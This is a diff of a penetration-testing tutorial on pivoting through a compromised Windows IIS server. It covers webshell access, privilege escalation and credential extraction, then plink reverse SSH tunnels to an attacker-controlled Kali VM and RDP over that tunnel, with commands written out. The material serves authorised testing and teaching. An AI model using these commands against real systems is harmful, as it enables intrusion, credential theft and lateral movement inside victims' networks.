@@ -2,12 +2,18 @@
 Pivoting with SSH Tunnels and Plink on a Windows server (basic example)
 ======================================================================================================
 
+Context
+--------
+During a penetration test, you managed to hack a vulnerable Internet-facing website (e.g. unpatched known RCE vulnerability, insecure file upload function, RFI, LFI)
+and you uploaded a webshell on the underlying IIS Web server which is running on a Windows server 2016.
+This Windows server is located inside your client's internal network (protected by a firewall) and you want to establish a tunnel between your pentester machine 
+(e.g. Kali Linux VM in AWS) and this Windows server or other machines located on the internal network.
 
-Step 1. During a penetration test, you managed to hack a vulnerable Internet facing website and you uploaded a webshell on the underlying IIS Web server
-        (which is running on a Windows server).
+Below are the steps to follow to be able to log into the compromised Windows server from the Internet (RDP over a SSH tunnel with plink) and then use this machine
+as a pivot to attack the other servers located on the internal network.
 
 
-Step 2. Using your webshell and native commands like 'Test-NetConnection' (or tools like 'portqry'), check that the underlying Windows server 
+Step 1. Using your webshell and native commands like 'Test-NetConnection' (or tools like 'portqry'), check that the underlying Windows server 
         can browse the Internet without going through a corporate proxy.
 
         + Examples for the PowerShell command 'Test-NetConnection'
@@ -19,16 +25,16 @@ Step 2. Using your webshell and native commands like 'Test-NetConnection' (or to
           > portqry.exe -n www.website.com -e 443
 
 
-Step 3. If you are lucky your webshell is already running as 'NT AUTHORITY\System', otherwise you need to escalate your privileges to become local admin
+Step 2. If you are lucky your webshell is already running as 'NT AUTHORITY\System', otherwise you need to escalate your privileges to become local admin
         (using for example the juicy potato exploit). Then create a new local admin account or extract & crack local admin creds from the SAM registry
         or live memory...
 
 
-Step 4. Upload the command line tool 'plink.exe' (included in the Putty installation package) on the compromised Windows server using your webshell
+Step 3. Upload the command line tool 'plink.exe' (included in the Putty installation package) on the compromised Windows server using your webshell
 
 
-Step 5. Execute a 'plink.exe' command with your webshell to create a SSH tunnel between the compromised Windows server and a remote Internet facing 
-        server that you control. You can use a Kali Linux VM hosted on the AWS Public Cloud platform or the Azure Public Cloud platform.
+Step 4. Execute a 'plink.exe' command with your webshell to create a SSH tunnel (remote port forward) between the compromised Windows server and 
+        a remote Internet facing server that you control. You can use a Kali Linux VM hosted on the AWS Public Cloud platform or the Azure Public Cloud platform.
 
         + Examples of command to execute on the compromised Windows server (via your webshell) to create an SSH remote port forward rule for the RDP port 3389.
           > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l root -pw <password> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 
@@ -36,20 +42,19 @@ Step 5. Execute a 'plink.exe' command with your webshell to create a SSH tunnel 
           > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l root -i <private-key.ppk> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 
 
 
-Step 6. Use RDP over the SSH tunnel (remote port forward rule) to log into the compromised Windows server from Internet with your Kali Linux VM
+Step 5. Use RDP over the SSH tunnel (remote port forward rule) to log into the compromised Windows server from Internet with your Kali Linux VM
         and pivot to attack the internal network.
-        
         On your Kali Linux VM you can use 'rdesktop' or 'xfreerdp' pointing to localhost and the port 1080
         => the RDP connection will be redirected through the SSH tunnel to the port 3389 of the compromised Windows server.
+      
+        # sudo apt-get update
+        # sudo apt install rdesktop
+        # rdesktop -u <local-admin-username> -p 'PASSWORD' localhost:1080 -g 1024×768
+       
+        OR
         
         # sudo apt-get update
         # sudo apt install freerdp2-x11 freerdp2-shadow-x11
         # xfreerdp /f /u:<local-admin-username> /p:PASSWORD /v:localhost:1080 
-        
-        OR
-        
-        # sudo apt-get update
-        # sudo apt install rdesktop
-        # rdesktop -u <local-admin-username> -p 'PASSWORD' localhost:1080 -g 1024×768
        
         
